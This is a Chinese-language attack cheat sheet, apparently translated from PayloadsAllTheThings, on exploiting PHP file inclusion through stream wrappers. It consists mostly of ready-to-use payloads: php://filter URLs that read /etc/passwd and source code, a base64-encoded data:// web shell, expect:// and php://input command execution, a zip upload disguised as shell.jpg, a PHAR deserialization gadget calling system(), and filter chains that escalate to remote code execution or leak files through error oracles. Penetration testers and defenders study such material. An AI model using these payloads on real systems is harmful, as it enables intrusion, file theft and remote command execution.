[原文文档](Wrappers.en.md)

# 使用包装器的文件包含

在文件包含漏洞的上下文中，包装器指的是用于访问或包含文件的协议或方法。包装器经常在PHP或其他服务器端语言中使用，以扩展文件包含功能，除了本地文件系统外，还可以使用HTTP、FTP等其他协议。

## 摘要

- [包装器php://filter](#包装器phpfilter)
- [包装器data://](#包装器data)
- [包装器expect://](#包装器expect)
- [包装器input://](#包装器input)
- [包装器zip://](#包装器zip)
- [包装器phar://](#包装器phar)
    - [PHAR存档结构](#phar存档结构)
    - [PHAR反序列化](#phar反序列化)
- [包装器convert.iconv://和dechunk://](#包装器converticonv和dechunk)
    - [从基于错误的预言机泄露文件内容](#从基于错误的预言机泄露文件内容)
    - [在自定义格式输出中泄露文件内容](#在自定义格式输出中泄露文件内容)
- [参考](#参考)

## 包装器php://filter

"`php://filter`"部分不区分大小写

| 过滤器 | 描述 |
| ------ | ----------- |
| `php://filter/read=string.rot13/resource=index.php` | 以rot13显示index.php |
| `php://filter/convert.iconv.utf-8.utf-16/resource=index.php` | 将index.php从utf8编码为utf16 |
| `php://filter/convert.base64-encode/resource=index.php` | 以base64编码字符串显示index.php |

```powershell
http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
http://example.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php
```

包装器可以与压缩包装器链接用于大文件。

```powershell
http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
```

注意：包装器可以使用`|`或`/`多次链接：

- 多次base64解码：`php://filter/convert.base64-decoder|convert.base64-decode|convert.base64-decode/resource=%s`
- deflate然后`base64encode`（对有限字符渗透有用）：`php://filter/zlib.deflate/convert.base64-encode/resource=/var/www/html/index.php`

```powershell
./kadimus -u "http://example.com/index.php?page=vuln" -S -f "index.php%00" -O index.php --parameter page 
curl "http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php" | base64 -d > index.php
```

还有一种将`php://filter`转换为完整RCE的方法。

- [synacktiv/php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator) - 用于生成PHP过滤器链的CLI

  ```powershell
  $ python3 php_filter_chain_generator.py --chain '<?php phpinfo();?>'
  [+] The following gadget chain will generate the following code : <?php phpinfo();?> (base64 value: PD9waHAgcGhwaW5mbygpOz8+)
  php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.UCS-2.UTF8|convert.iconv.L6.UTF8|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF1... [truncated]
  ```

- [LFI2RCE.py](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Files/LFI2RCE.py) 用于生成自定义payload。

  ```powershell
  # vulnerable file: index.php
  # vulnerable parameter: file
  # executed command: id
  # executed PHP code: <?=`$_GET[0]`;;?>
  curl "127.0.0.1:8000/index.php?0=id&file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.... [truncated]
  ```

## 包装器data://

base64编码的payload是"`<?php system($_GET['cmd']);echo 'Shell done !'; ?>`"。

```powershell
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
```

有趣的事实：您可以使用以下方法触发XSS并绕过Chrome审计器：`http://example.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+`

## 包装器expect://

当在PHP或类似应用程序中使用时，它可能允许攻击者指定在系统Shell中执行的命令，因为`expect://`包装器可以在其输入中调用Shell命令。

```powershell
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```

## 包装器input://

在POST参数中指定您的payload，这可以用简单的`curl`命令完成。

```powershell
curl -X POST --data "<?php echo shell_exec('id'); ?>" "https://example.com/index.php?page=php://input%00" -k -v
```

另外，Kadimus有一个模块可以自动化此攻击。

```powershell
./kadimus -u "https://example.com/index.php?page=php://input%00"  -C '<?php echo shell_exec("id"); ?>' -T input
```

## 包装器zip://

- 创建恶意payload：`echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;`
- 压缩文件

  ```python
  zip payload.zip payload.php;
  mv payload.zip shell.jpg;
  rm payload.php
  ```

- 上传存档并使用包装器访问文件：

  ```ps1
  http://example.com/index.php?page=zip://shell.jpg%23payload.php
  ```

## 包装器phar://

### PHAR存档结构

PHAR文件的工作方式类似于ZIP文件，当您可以使用`phar://`访问存储在其中的文件时。

- 创建一个包含后门文件的phar存档：`php --define phar.readonly=0 archive.php`

  ```php
  <?php
    $phar = new Phar('archive.phar');
    $phar->startBuffering();
    $phar->addFromString('test.txt', '<?php phpinfo(); ?>');
    $phar->setStub('<?php __HALT_COMPILER(); ?>');
    $phar->stopBuffering();
  ?>
  ```

- 使用`phar://`包装器：`curl http://127.0.0.1:8001/?page=phar:///var/www/html/archive.phar/test.txt`

### PHAR反序列化

:warning: 此技术在PHP 8+上不起作用，反序列化已被移除。

如果现在通过`phar://`包装器对我们现有的phar文件执行文件操作，则其序列化的元数据将被反序列化。此漏洞出现在以下函数中，包括file_exists：`include`、`file_get_contents`、`file_put_contents`、`copy`、`file_exists`、`is_executable`、`is_file`、`is_dir`、`is_link`、`is_writable`、`fileperms`、`fileinode`、`filesize`、`fileowner`、`filegroup`、`fileatime`、`filemtime`、`filectime`、`filetype`、`getimagesize`、`exif_read_data`、`stat`、`lstat`、`touch`、`md5_file`等。

此利用需要至少一个具有魔术方法的类，如`__destruct()`或`__wakeup()`。
让我们以这个`AnyClass`类为例，它执行参数数据。

```php
class AnyClass {
    public $data = null;
    public function __construct($data) {
        $this->data = $data;
    }
    
    function __destruct() {
        system($this->data);
    }
}

...
echo file_exists($_GET['page']);
```

我们可以制作一个包含其元数据中序列化对象的phar存档。

```php
// 创建新Phar
$phar = new Phar('deser.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

// 将任何类的对象添加为元数据
class AnyClass {
    public $data = null;
    public function __construct($data) {
        $this->data = $data;
    }
    
    function __destruct() {
        system($this->data);
    }
}
$object = new AnyClass('whoami');
$phar->setMetadata($object);
$phar->stopBuffering();
```

最后调用phar包装器：`curl http://127.0.0.1:8001/?page=phar:///var/www/html/deser.phar`

注意：您可以使用`$phar->setStub()`添加JPG文件的魔术字节：`\xff\xd8\xff`

```php
$phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>");
```

## 包装器convert.iconv://和dechunk://

### 从基于错误的预言机泄露文件内容

- `convert.iconv://`: 将输入转换到另一个文件夹（`convert.iconv.utf-16le.utf-8`）
- `dechunk://`: 如果字符串不包含换行符，则仅当字符串以A-Fa-f0-9开头时，它才会清除整个字符串

此利用的目标是一次泄露一个文件的内容，基于[DownUnderCTF](https://github.com/DownUnderCTF/Challenges_2022_Public/blob/main/web/minimal-php/solve/solution.py)撰写。

**要求**:

- 后端不得使用`file_exists`或`is_file`。
- 易受攻击的参数应在`POST`请求中。
    - 由于大小限制，您无法在GET请求中泄露超过135个字符

利用链基于PHP过滤器：`iconv`和`dechunk`：

1. 使用`iconv`过滤器以及指数增加数据大小的编码来触发内存错误。
2. 使用`dechunk`过滤器基于前一个错误确定文件的第一个字符。
3. 再次使用`iconv`过滤器，使用具有不同字节顺序的编码将剩余字符与第一个字符交换。

使用[synacktiv/php_filter_chains_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit)进行利用，脚本将使用`HTTP状态码：500`或时间作为基于错误的预言机来确定字符。

```ps1
$ python3 filters_chain_oracle_exploit.py --target http://127.0.0.1 --file '/test' --parameter 0   
[*] The following URL is targeted : http://127.0.0.1
[*] The following local file is leaked : /test
[*] Running POST requests
[+] File /test leak is finished!
```

### 在自定义格式输出中泄露文件内容

- [ambionics/wrapwrap](https://github.com/ambionics/wrapwrap) - 生成一个`php://filter`链，为文件内容添加前缀和后缀。

为了获取某个文件的内容，我们希望有：`{"message":"<file contents>"}`。

```ps1
./wrapwrap.py /etc/passwd 'PREFIX' 'SUFFIX' 1000
./wrapwrap.py /etc/passwd '{"message":"' '"}' 1000
./wrapwrap.py /etc/passwd '<root><name>' '</name></root>' 1000
```

这可以用于针对以下易受攻击的代码。

```php
<?php
  $data = file_get_contents($_POST['url']);
  $data = json_decode($data);
  echo $data->message;
?>
```

### 使用盲文件读取原语泄露文件内容

- [ambionics/lightyear](https://github.com/ambionics/lightyear)

```ps1
code remote.py # edit Remote.oracle
./lightyear.py test # test that your implementation works
./lightyear.py /etc/passwd # dump a file!
```

## 参考

- [Baby^H Master PHP 2017 - Orange Tsai (@orangetw) - 2021年12月5日](https://github.com/orangetw/My-CTF-Web-Challenges#babyh-master-php-2017)
- [Iconv, set the charset to RCE: exploiting the libc to hack the php engine (part 1) - Charles Fol - 2024年5月27日](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)
- [Introducing lightyear: a new way to dump PHP files - Charles Fol - 2024年11月4日](https://www.ambionics.io/blog/lightyear-file-dump)
- [Introducing wrapwrap: using PHP filters to wrap a file with a prefix and suffix - Charles Fol - 2023年12月11日](https://www.ambionics.io/blog/wrapwrap-php-filters-suffix)
- [It's A PHP Unserialization Vulnerability Jim But Not As We Know It - Sam Thomas - 2018年8月10日](https://github.com/s-n-t/presentations/blob/master/us-18-Thomas-It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf)
- [New PHP Exploitation Technique - Dr. Johannes Dahse - 2018年8月14日](https://web.archive.org/web/20180817103621/https://blog.ripstech.com/2018/new-php-exploitation-technique/)
- [OffensiveCon24 - Charles Fol- Iconv, Set the Charset to RCE - 2024年6月14日](https://youtu.be/dqKFHjcK9hM)
- [PHP FILTER CHAINS: FILE READ FROM ERROR-BASED ORACLE - Rémi Matasse - 2023年3月21日](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html)
- [PHP FILTERS CHAIN: WHAT IS IT AND HOW TO USE IT - Rémi Matasse - 2022年10月18日](https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it.html)
- [Solving "includer's revenge" from hxp ctf 2021 without controlling any files - @loknop - 2021年12月30日](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d)